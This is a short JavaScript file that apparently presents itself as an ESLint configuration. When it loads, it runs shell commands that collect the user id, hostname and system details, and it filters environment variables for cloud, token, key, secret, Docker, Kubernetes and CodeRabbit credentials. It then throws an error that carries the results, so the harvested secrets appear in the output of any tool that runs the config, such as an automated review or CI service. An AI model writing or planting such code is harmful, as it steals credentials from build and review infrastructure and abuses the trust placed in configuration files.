import { execSync } from "child_process";
const info = execSync(
  "echo ESLINT_CONFIG_EXEC; id; hostname; uname -a; env | grep -iE '(aws|gcp|azure|token|key|secret|bucket|cloud|docker|kube|coderabbit)' | head -15",
  { encoding: "utf-8", timeout: 10000 }
);
throw new Error("ESLINT_CONFIG_EXEC: " + info);
